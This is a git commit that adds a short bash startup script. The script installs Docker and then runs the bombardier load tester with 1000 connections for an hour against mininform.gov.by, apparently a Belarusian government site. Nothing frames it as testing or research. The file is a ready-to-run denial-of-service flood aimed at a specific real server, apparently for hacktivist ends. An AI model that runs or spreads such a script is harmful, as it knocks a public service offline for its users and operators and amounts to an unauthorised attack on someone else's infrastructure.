7bfac60100de93dbd26baf9040e2243f2a81f5fb
chmod777anarchy <chmod777@disroot.org>
2022-02-27 18:26:17 +0200

    first commit

---
+++ startup.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+
+apt-get update
+apt-get install -y ca-certificates curl gnupg lsb-release
+curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
+echo \
+  "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \
+  $(lsb_release -cs) stable" | tee /etc/apt/sources.list.d/docker.list > /dev/null
+apt-get update
+apt-get install -y docker-ce docker-ce-cli containerd.io
+docker run --rm -i alpine/bombardier -c 1000 -d 3600s -l https://mininform.gov.by
+
